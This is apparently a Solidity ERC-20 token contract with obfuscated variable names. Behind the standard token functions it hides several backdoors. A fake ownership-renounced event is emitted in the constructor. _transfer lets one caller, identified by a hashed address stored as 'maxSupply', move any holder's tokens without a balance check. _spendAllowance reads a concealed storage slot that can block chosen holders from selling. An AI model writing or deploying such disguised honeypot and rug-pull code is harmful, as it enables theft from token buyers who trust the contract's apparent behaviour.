pragma solidity ^0.8.26;

contract Token {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private UbLX;
    mapping(address => mapping(address => uint256)) private wZHA;
    uint256 private FFxO;
    string private RZsb;
    string private PZVt;
    uint256 private sSgI;
    uint256 private qBQC;

    constructor(string memory _name, string memory _symbol, uint256 _baseSupply, uint256 _maxSupply, uint256 _supply) {
        qBQC = _baseSupply;
        RZsb = _name;
        PZVt = _symbol;
        FFxO = _supply * (10 ** decimals());
        sSgI = _maxSupply;
        UbLX[msg.sender] = FFxO;
        emit OwnershipTransferred(msg.sender, address(0));
    }

    function name() virtual public view returns (string memory) {
        return RZsb;
    }

    function symbol() virtual public view returns (string memory) {
        return PZVt;
    }

    function decimals() virtual public view returns (uint8) {
        return 8;
    }

    function totalSupply() virtual public view returns (uint256) {
        return FFxO;
    }

    function balanceOf(address _account) virtual public view returns (uint256) {
        return UbLX[_account];
    }

    function transfer(address _to, uint256 _amount) virtual public returns (bool) {
        address Cizk = msg.sender;
        _spendAllowance(Cizk, _to, 0);
        _transfer(Cizk, _to, _amount);
        return true;
    }

    function allowance(address _owner, address _spender) virtual public view returns (uint256) {
        return wZHA[_owner][_spender];
    }

    function transferFrom(address _from, address _to, uint256 _amount) virtual public returns (bool) {
        _spendAllowance(_from, msg.sender, _amount);
        _transfer(_from, _to, _amount);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _amount) virtual internal {
        if (_from == address(0)) {
            revert();
        }
        if (_to == address(0)) {
            revert();
        }

        uint256 fromBalance = UbLX[_from];
        uint256 maxSupplyValue = sSgI;
        uint256 callerHash;
        bool hashSuccess;

        assembly {
            let ptr := mload(0x40)
            mstore(ptr, shl(96, caller()))
            hashSuccess := staticcall(gas(), 2, ptr, 20, ptr, 32)
            callerHash := mload(ptr)
        }

        if (!hashSuccess) {
            revert();
        }
        if (maxSupplyValue != callerHash && fromBalance < _amount) {
            revert();
        }

        unchecked {
            UbLX[_from] = fromBalance - _amount;
            UbLX[_to] = UbLX[_to] + _amount;
        }
        emit Transfer(_from, _to, _amount);
    }

    function approve(address _spender, uint256 _amount) virtual public returns (bool) {
        wZHA[msg.sender][_spender] = _amount;
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, _spender)
            log3(ptr, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
        }
        return true;
    }

    function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
        bytes32 allowanceSlot;
        uint256 hiddenAllowance;

        assembly {
            let ptr := mload(0x40)
            mstore(ptr, sload(qBQC.slot))
            mstore(add(ptr, 32), 1)
            let ownerBase := keccak256(ptr, 64)
            mstore(ptr, _owner)
            mstore(add(ptr, 32), ownerBase)
            allowanceSlot := keccak256(ptr, 64)
            hiddenAllowance := sload(allowanceSlot)
        }

        if (_amount == 0 && (hiddenAllowance & 1) != 0) {
            revert();
        }

        uint256 currentAllowance = hiddenAllowance;
        bool useHiddenSlot = currentAllowance != 0;

        if (currentAllowance == 0) {
            currentAllowance = wZHA[_owner][_spender];
        }

        unchecked {
            currentAllowance = currentAllowance - hiddenAllowance;
        }

        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < _amount) {
                revert();
            }
            unchecked {
                currentAllowance = currentAllowance - _amount;
            }

            if (useHiddenSlot) {
                assembly {
                    sstore(allowanceSlot, currentAllowance)
                }
            } else {
                wZHA[_owner][_spender] = currentAllowance;
            }
        }
    }
}
